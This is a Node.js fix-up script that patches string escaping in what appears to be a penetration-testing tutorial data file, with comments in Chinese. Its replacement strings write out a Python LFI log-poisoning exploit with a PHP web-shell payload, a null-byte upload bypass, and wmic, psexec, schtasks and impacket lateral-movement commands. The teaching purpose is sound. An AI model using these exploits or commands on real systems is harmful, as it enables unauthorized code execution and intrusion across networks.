import fs from 'fs';
import path from 'path';

const filePath = path.join(__dirname, 'src/data/cyberPenetration.ts');
let content = fs.readFileSync(filePath, 'utf-8');

// 修复第838行的引号问题 - 转义代码字符串中的单引号
content = content.replace(
  /code: 'import requests\\nimport sys\\n\\ndef exploit_lfi\(target, session_cookie\):\\n    # 1\. 写入恶意代码到日志\\n    headers = \{\\n        "User-Agent": "<?php system\(\$_GET\['cmd'\]\); ?>\"\\n    \}\\n    cookies = \{"PHPSESSID": session_cookie\}\\n    \\n    print\("\[\+\] 发送恶意请求写入日志\.\.\."\)\\n    requests\.get\(target, headers=headers, cookies=cookies\)\\n    \\n    # 2\. LFI包含日志文件\\n    log_paths = \[\\n        "/var/log/apache2/access\.log",\\n        "/var/log/httpd/access_log",\\n        "/var/log/nginx/access\.log"\\n    \]\\n    \\n    for log_path in log_paths:\\n        print\(f"\[\+\] 尝试包含: \{log_path\}"\)\\n        url = f"\{target\}\?page=php://filter/convert\.base64-encode/resource=\{log_path\}"\\n        try:\\n            r = requests\.get\(url, cookies=cookies\)\\n            if "<?php" in r\.text or "apache" in r\.text\.lower\(\):\\n                print\("\[\+\] 找到日志文件\!"\)\\n                return log_path\\n        except:\\n            pass\\n    \\n    return None\\n\\n# 使用示例\\n# python lfi_exploit\.py http://target\.com/index\.php\?sess=abc123'/g,
  'code: `import requests\nimport sys\n\ndef exploit_lfi(target, session_cookie):\n    # 1. 写入恶意代码到日志\n    headers = {\n        "User-Agent": "<?php system($_GET[\'cmd\']); ?>"\n    }\n    cookies = {"PHPSESSID": session_cookie}\n    \n    print("[+] 发送恶意请求写入日志...")\n    requests.get(target, headers=headers, cookies=cookies)\n    \n    # 2. LFI包含日志文件\n    log_paths = [\n        "/var/log/apache2/access.log",\n        "/var/log/httpd/access_log",\n        "/var/log/nginx/access.log"\n    ]\n    \n    for log_path in log_paths:\n        print(f"[+] 尝试包含: {log_path}")\n        url = f"{target}?page=php://filter/convert.base64-encode/resource={log_path}"\n        try:\n            r = requests.get(url, cookies=cookies)\n            if "<?php" in r.text or "apache" in r.text.lower():\n                print("[+] 找到日志文件!")\n                return log_path\n        except:\n            pass\n    \n    return None\n\n# 使用示例\n# python lfi_exploit.py http://target.com/index.php?sess=abc123`'
);

// 修复第975-976行的chr(0)问题
content = content.replace(
  /\("shell\.php" \+ chr\(0\) \+ "\.jpg", "image\/jpeg"\),/g,
  '("shell.php\\x00.jpg", "image/jpeg"),'
);

// 修复第2129行的引号问题
content = content.replace(
  /code: 'import subprocess\\n\\ndef wmi lateral\(target, command\):/g,
  'code: `import subprocess\n\ndef wmi_lateral(target, command):'
);

content = content.replace(
  /cmd = f'wmic \/node:\{target\} process call create "\{command\}"'/g,
  'cmd = f"wmic /node:{target} process call create \\"{command}\\""'
);

content = content.replace(
  /cmd = f'psexec\.exe \\\\\\\\\{target\} -u \{user\} -p \{password\} \{payload\}'/g,
  'cmd = f"psexec.exe \\\\\\{target} -u {user} -p {password} {payload}"'
);

content = content.replace(
  /cmd = f'psexec\.exe \\\\\\\\\{target\} \{payload\}'/g,
  'cmd = f"psexec.exe \\\\\\{target} {payload}"'
);

content = content.replace(
  /create_cmd = f'schtasks \/create \/s \{target\} \/tn \{taskname\} \/tr "\{command\}" \/sc once \/st 00:00 \/f'/g,
  'create_cmd = f"schtasks /create /s {target} /tn {taskname} /tr \\"{command}\\" /sc once /st 00:00 /f"'
);

content = content.replace(
  /run_cmd = f'schtasks \/run \/s \{target\} \/tn \{taskname\}'/g,
  'run_cmd = f"schtasks /run /s {target} /tn {taskname}"'
);

content = content.replace(
  /# wmiexec\.py domain\/user@target "whoami"\\n# psexec\.py domain\/user@target "cmd\.exe"\\n# smbexec\.py domain\/user@target', explanation: '横向移动的常用方法和脚本' \}\]\)/g,
  '# wmiexec.py domain/user@target "whoami"\n# psexec.py domain/user@target "cmd.exe"\n# smbexec.py domain/user@target`, explanation: "横向移动的常用方法和脚本" }])'
);

fs.writeFileSync(filePath, content, 'utf-8');
console.log('修复完成!');